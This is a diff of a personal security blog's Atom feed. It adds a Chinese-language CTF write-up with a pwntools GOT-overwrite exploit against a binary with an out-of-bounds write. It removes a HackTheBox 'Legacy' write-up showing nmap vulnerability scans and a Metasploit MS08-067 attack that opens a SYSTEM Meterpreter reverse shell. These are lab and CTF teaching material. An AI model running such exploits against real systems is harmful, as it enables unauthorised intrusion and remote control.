@@ -6,7 +6,7 @@
   <link href="https://kazma.tw/atom.xml" rel="self"/>
   
   <link href="https://kazma.tw/"/>
-  <updated>2024-11-07T17:43:31.492Z</updated>
+  <updated>2024-11-11T06:03:07.380Z</updated>
   <id>https://kazma.tw/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Pwn CTF doors Writeup</title>
+    <link href="https://kazma.tw/2024/11/11/Pwn-CTF-doors-Writeup/"/>
+    <id>https://kazma.tw/2024/11/11/Pwn-CTF-doors-Writeup/</id>
+    <published>2024-11-11T05:55:04.818Z</published>
+    <updated>2024-11-11T06:03:07.380Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>首先我們看一下這題的保護機制：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec doors</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/doors&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></div><p>然後我們看到程式主邏輯很簡單：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input_num; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There are many doors.\nChoose one and enter the correct password than you will got the treasure !!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The door number you  want to choose : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input_num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, (<span class="type">char</span> *)&amp;doors + <span class="number">8</span> * input_num);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Oh no,password is wrong,try again ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>以及一個後門：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">treasure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>所以觀察一下使用者可控的兩個輸入，我們可以發現第一個輸入可以讓第二個輸入任意寫，然後我們可以透過任意寫 puts 的 got 來達成 GOT-Hijacking 然後跳到 treasure 觸發 RCE。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./doors&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./doors&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">doors = elf.symbols[<span class="string">&#x27;doors&#x27;</span>]</span><br><span class="line">treasure = elf.symbols[<span class="string">&#x27;treasure&#x27;</span>]</span><br><span class="line"></span><br><span class="line">idx = (puts_got - doors) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(treasure))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;首先我們看一下這題的保護機制：&lt;/p&gt;
+&lt;div class</summary>
+      
+    
+    
+    
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
+    <category term="oob-write" scheme="https://kazma.tw/tags/oob-write/"/>
+    
+  </entry>
   
   <entry>
     <title>HackTheBox-Challenges Entity Writeup</title>
@@ -36,11 +63,11 @@
     
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
   </entry>
   
@@ -65,11 +92,11 @@
     
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
   </entry>
   
@@ -93,11 +120,11 @@
     
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="retlibc" scheme="https://kazma.tw/tags/retlibc/"/>
     
@@ -124,11 +151,11 @@
     
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="fmt-write" scheme="https://kazma.tw/tags/fmt-write/"/>
     
@@ -515,11 +542,11 @@
     
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="fmtstr" scheme="https://kazma.tw/tags/fmtstr/"/>
     
@@ -544,11 +571,11 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
     
@@ -575,41 +602,11 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
     
-    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
-    
-    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HackTheBox-Machines Legacy Writeup</title>
-    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/"/>
-    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/</id>
-    <published>2024-10-27T09:38:00.249Z</published>
-    <updated>2024-10-27T11:10:12.335Z</updated>
-    
-    <content type="html"><![CDATA[<p>從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：<br><a class="link"   href="https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation" >https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>今天要打的是 Windows 的 legacy</p><p>先 <code>nmap</code> 掃一下</p><ul><li><code>-sV</code> 是服務版本偵測</li><li><code>--script=vuln</code> 會針對已知漏洞進行檢查<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script=vuln 10.129.152.110</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:21 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.152.110</span><br><span class="line">Host is up (0.078s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.14 seconds</span><br></pre></td></tr></table></figure></div>掃描結果是有三個服務開啟，其中有 smb-vuln-ms17-010 的漏洞，是一個 SMB 的 RCE 洞，我們可以用 msfconsole 扁他。<br>結果一直遇到這個問題：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.152.110:445 - Target OS: Windows 5.1</span><br><span class="line">[-] 10.129.152.110:445 - Unable to find accessible named pipe!</span><br><span class="line">^[c[*] Exploit completed, but no session was created.1</span><br></pre></td></tr></table></figure></div>超怪，網路上看到有人用這個洞打進去，但是看到有些人是打 netbios 的洞，而且他們用 <code>nmap</code> 用一樣的指令有掃到 CVE-2008-4250 超怪。<br>結果機器重開之後就有了？？？<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap --script vuln 10.129.227.181</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:52 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.227.181</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service <span class="keyword">in</span> Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.00 seconds</span><br></pre></td></tr></table></figure></div>超蠢結果機器重開就有了：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfconsole</span><br><span class="line">Metasploit tip: Use the edit <span class="built_in">command</span> to open the currently active module </span><br><span class="line"><span class="keyword">in</span> your editor</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2008-4250</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 0</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> rhost 10.129.227.181</span><br><span class="line">rhost =&gt; 10.129.227.181</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.227.181:445 - Automatically detecting the target...</span><br><span class="line">[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English</span><br><span class="line">[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.227.181</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.227.181:1039) at 2024-10-27 05:55:37 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; <span class="built_in">id</span> </span><br><span class="line">[-] Unknown <span class="built_in">command</span>: <span class="built_in">id</span></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/legacy_pwn.png"                      alt="pwn"                ></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：&lt;br&gt;&lt;a class=&quot;link&quot;   href=&quot;https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation&quot; &gt;</summary>
-      
-    
-    
-    
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
-    
-    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
     
     <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
     
